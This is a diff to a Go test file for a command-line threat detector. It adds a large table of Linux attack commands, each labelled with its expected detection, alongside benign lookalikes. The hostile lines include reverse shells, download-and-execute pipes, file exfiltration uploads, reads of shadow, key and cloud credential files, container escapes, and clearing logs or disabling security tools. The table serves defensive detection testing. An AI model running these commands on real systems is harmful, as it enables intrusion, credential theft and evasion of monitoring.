@@ -105,7 +105,7 @@ func TestDetectWindows(t *testing.T) {
 		{"curl to a file", `curl -s -o /tmp/a.bin http://198.51.100.7/a.bin`, []string{"FileDownload"}},
 		{"curl calling an api", `curl -s -H "Authorization: Bearer $T" https://api.example.com/v1/items`, nil},
 		{"curl sending a file", `curl -s -X POST --data-binary @loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
-		{"curl piped to a shell", `curl -s http://198.51.100.7/a.sh | bash`, []string{"DownloadAndExecute"}},
+		{"curl piped to a shell", `curl -s http://198.51.100.7/a.sh | bash`, []string{"ShellDownloadAndExecute"}},
 		{"wget", `wget http://198.51.100.7/a.bin`, []string{"FileDownload"}},
 		{"wget posting a file", `wget --post-file=loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
 		{"requests with a file", `requests.post(url, files={"f": open("loot.zip", "rb")})`, []string{"FileUpload"}},
@@ -128,7 +128,7 @@ func TestDetectWindows(t *testing.T) {
 		{"task created", `schtasks.exe /create /tn U /tr x /sc onlogon`, []string{"ScheduledTaskCreation"}},
 		{"tasks listed", `schtasks /query /fo list`, nil},
 		{"service created", `sc.exe \\dc01 create U binPath= x`, []string{"ServiceCreation"}},
-		{"services listed", `sc query`, nil},
+		{"services listed", `sc query`, []string{"ServiceDiscovery"}},
 		{"log cleared", `wevtutil cl Security`, []string{"EventLogClearing"}},
 		{"log read", `wevtutil qe Security /c:5`, nil},
 		{"hive saved", `reg save HKLM\SAM C:\Users\Public\s.hiv`, []string{"RegistryHiveDump"}},
@@ -138,6 +138,145 @@ func TestDetectWindows(t *testing.T) {
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
+			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
+				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
+			}
+		})
+	}
+}
+
+// linuxCases are short fragments, with variables where a value would go.
+// They also feed the corpus that checks every pattern's literals.
+//
+//nolint:gochecknoglobals // a table shared by two tests
+var linuxCases = []struct {
+	line string
+	want []string
+}{
+	{`(crontab -l; echo "$JOB") | crontab -`, []string{"ScheduledJobCreation"}},
+	{`crontab jobs.txt`, []string{"ScheduledJobCreation"}},
+	{`crontab -l`, nil},
+	{`crontab -u svc -e`, []string{"ScheduledJobCreation"}},
+	{`echo "$JOB" >> /etc/cron.d/sync`, []string{"ScheduledJobCreation"}},
+	{`echo "$F" | at now + 1 minute`, []string{"ScheduledJobCreation"}},
+	{`systemd-run --on-calendar=hourly "$F"`, []string{"ScheduledJobCreation"}},
+	{`systemctl enable --now sync.timer`, []string{"ScheduledJobCreation"}},
+	{`cp sync.service /etc/systemd/system/sync.service`, []string{"SystemdUnitCreation"}},
+	{`systemctl enable --now sync.service`, []string{"SystemdUnitCreation"}},
+	{`systemctl status sshd`, []string{"ServiceDiscovery"}},
+	{`service --status-all`, []string{"ServiceDiscovery"}},
+	{`systemctl restart sshd`, nil},
+	{`useradd -m -s /bin/bash svc`, []string{"AccountCreation"}},
+	{`net user svc "$P" /add`, []string{"AccountCreation"}},
+	{`New-LocalUser -Name svc`, []string{"AccountCreation"}},
+	{`net user`, nil},
+	{`echo "$KEY" >> ~/.ssh/authorized_keys`, []string{"SshKeyPersistence"}},
+	{`ssh-copy-id -i k.pub user@10.0.0.5`, []string{"SshKeyPersistence"}},
+	{`cat ~/.ssh/authorized_keys`, nil},
+	{`echo "$LINE" >> ~/.bashrc`, []string{"ShellProfilePersistence"}},
+	{`echo "$LINE" >> ~/.profile`, []string{"ShellProfilePersistence"}},
+	{`source ~/.bashrc`, nil},
+
+	{`echo "$RULE" >> /etc/sudoers.d/svc`, []string{"SudoersModification"}},
+	{`echo 'svc ALL=(ALL) NOPASSWD: ALL' | tee rule`, []string{"SudoersModification"}},
+	{`cat /etc/sudoers`, nil},
+	{`chmod u+s "$F"`, []string{"SetuidBit"}},
+	{`chmod 4755 /tmp/tool`, []string{"SetuidBit"}},
+	{`chmod 755 run.sh`, nil},
+	{`docker run --privileged -it alpine sh`, []string{"ContainerEscape"}},
+	{`docker run -v /:/host alpine ls /host`, []string{"ContainerEscape"}},
+	{`nsenter -t 1 -m -u -i -n sh`, []string{"ContainerEscape"}},
+	{`curl --unix-socket /var/run/docker.sock http://localhost/containers/json`, []string{"ContainerEscape"}},
+	{`docker ps`, nil},
+	{`insmod ./mod.ko`, []string{"KernelModuleLoad"}},
+	{`modprobe mod`, []string{"KernelModuleLoad"}},
+	{`modprobe -r mod`, nil},
+	{`LD_PRELOAD=/tmp/x.so id`, []string{"DynamicLinkerHijack"}},
+	{`echo /tmp/x.so > /etc/ld.so.preload`, []string{"DynamicLinkerHijack"}},
+	{`find / -perm -4000 -type f 2>/dev/null`, []string{"SetuidFileSearch"}},
+	{`find / -perm -u=s -type f`, []string{"SetuidFileSearch"}},
+	{`find / -name '*.conf'`, nil},
+
+	{`cat /etc/shadow > s.txt`, []string{"ShadowFileRead"}},
+	{`unshadow p s > u`, []string{"ShadowFileRead"}},
+	{`cat /etc/passwd`, nil},
+	{`cat ~/.ssh/id_rsa`, []string{"PrivateKeyRead"}},
+	{`cp /etc/ssh/ssh_host_rsa_key .`, []string{"PrivateKeyRead"}},
+	{`cat ~/.ssh/id_rsa.pub`, nil},
+	{`cat ~/.aws/credentials`, []string{"CredentialFileRead"}},
+	{`cat ~/.config/gcloud/credentials.db`, []string{"CredentialFileRead"}},
+	{`cat ~/.azure/accessTokens.json`, []string{"CredentialFileRead"}},
+	{`cp ~/.kube/config .`, []string{"CredentialFileRead"}},
+	{`cat ~/.docker/config.json`, []string{"CredentialFileRead"}},
+	{`cat ~/.netrc`, []string{"CredentialFileRead"}},
+	{`grep -i token ~/.bash_history`, []string{"ShellHistoryRead"}},
+	{`curl -s http://169.254.169.254/latest/meta-data/`, []string{"CloudMetadataAccess"}},
+	{`curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/`, []string{"CloudMetadataAccess"}}, //nolint:misspell // the header is spelled so
+	{`gcore -o dump "$PID"`, []string{"ProcessMemoryDump"}},
+	{`cat /proc/$PID/maps`, []string{"ProcessMemoryDump"}},
+	{`kubectl get secrets -A -o yaml`, []string{"ClusterSecretRead"}},
+	{`cat /var/run/secrets/kubernetes.io/serviceaccount/token`, []string{"ClusterSecretRead"}},
+	{`curl -sk "$API/api/v1/namespaces/default/secrets"`, []string{"ClusterSecretRead"}},
+	{`kubectl get pods`, nil},
+
+	{`rm -f /var/log/auth.log`, []string{"LogDeletion"}},
+	{`: > /var/log/wtmp`, []string{"LogDeletion"}},
+	{`journalctl --vacuum-time=1s`, []string{"LogDeletion"}},
+	{`tail /var/log/syslog`, nil},
+	{`history -c`, []string{"HistoryClearing"}},
+	{`rm -f ~/.bash_history`, []string{"HistoryClearing"}},
+	{`cat /dev/null > ~/.bash_history`, []string{"HistoryClearing"}},
+	{`ln -sf /dev/null ~/.bash_history`, []string{"HistoryClearing"}},
+	{`unset HISTFILE`, []string{"HistoryDisabling"}},
+	{`export HISTFILE=/dev/null`, []string{"HistoryDisabling"}},
+	{`export HISTSIZE=0`, []string{"HistoryDisabling"}},
+	{`set +o history`, []string{"HistoryDisabling"}},
+	{`setenforce 0`, []string{"SecurityToolDisabling"}},
+	{`systemctl stop auditd`, []string{"SecurityToolDisabling"}},
+	{`service rsyslog stop`, []string{"SecurityToolDisabling"}},
+	{`auditctl -e 0`, []string{"SecurityToolDisabling"}},
+	{`pkill -9 auditd`, []string{"SecurityToolDisabling"}},
+	{`systemctl status auditd`, []string{"ServiceDiscovery"}},
+	{`iptables -F`, []string{"FirewallDisabling"}},
+	{`iptables -P INPUT ACCEPT`, []string{"FirewallDisabling"}},
+	{`ufw disable`, []string{"FirewallDisabling"}},
+	{`nft flush ruleset`, []string{"FirewallDisabling"}},
+	{`systemctl disable --now firewalld`, []string{"FirewallDisabling"}},
+	{`Set-NetFirewallProfile -All -Enabled False`, []string{"FirewallDisabling"}},
+	{`netsh advfirewall set allprofiles state off`, []string{"FirewallDisabling"}},
+	{`iptables -L -n`, nil},
+	{`touch -r /bin/ls "$F"`, []string{"Timestomp"}},
+	{`touch --date="2020-01-01" "$F"`, []string{"Timestomp"}},
+	{`touch new.txt`, nil},
+
+	{`exec 3<>/dev/tcp/$H/$PORT`, []string{"ReverseShell"}},
+	{`ncat "$H" "$PORT" -e "$SH"`, []string{"ReverseShell"}},
+	{`nc "$H" "$PORT" -e /bin/sh`, []string{"ReverseShell"}},
+	{`socat tcp:$H:$PORT exec:$SH`, []string{"ReverseShell"}},
+	{`pty.spawn(shell)`, []string{"ReverseShell"}},
+	{`nc -zv 10.0.0.5 22`, nil},
+	{`curl -fsSL "$U" | sudo bash`, []string{"ShellDownloadAndExecute"}},
+	{`wget -qO- "$U" | python3`, []string{"ShellDownloadAndExecute"}},
+	{`bash -c "$(curl -fsSL "$U")"`, []string{"ShellDownloadAndExecute"}},
+	{`bash <(curl -s "$U")`, []string{"ShellDownloadAndExecute"}},
+	{`source <(curl -s "$U")`, []string{"ShellDownloadAndExecute"}},
+	{`eval "$(wget -qO- "$U")"`, []string{"ShellDownloadAndExecute"}},
+	{`curl -s "$U" | jq .`, nil},
+	{`tar czf out.tgz dir/`, []string{"ArchiveCreation"}},
+	{`zip -r out.zip dir`, []string{"ArchiveCreation"}},
+	{`7z a out.7z dir`, []string{"ArchiveCreation"}},
+	{`Compress-Archive -Path d -DestinationPath o.zip`, []string{"ArchiveCreation"}},
+	{`tar --create --file out.tar dir`, []string{"ArchiveCreation"}},
+	{`tar xzf out.tgz`, nil},
+}
+
+func TestDetectLinux(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tt := range linuxCases {
+		t.Run(tt.line, func(t *testing.T) {
 			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
 				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
 			}
@@ -367,7 +506,10 @@ func TestLiteralsAreSound(t *testing.T) {
 		"bitsadmin /transfer j /upload", "Start-BitsTransfer -Source f -Destination u -TransferType Upload", "$w.UploadFile(u, f)", "reg query HKLM\\Software",
 		"wget http://h/f", "urlretrieve(u, f)", "curl -T f u", "wget --post-file f u", "Invoke-RestMethod u -InFile f", "iwr u -InFile f", "irm u -InFile f",
 		"requests.post(u, files=d)", "curl u | bash",
-		"amsiInitFailed", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
+		"amsiInitFailed", "sc query", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
+	}
+	for _, c := range linuxCases {
+		corpus = append(corpus, c.line)
 	}
 	check := func(owner string, p pattern) {
 		if len(p.literals) == 0 {
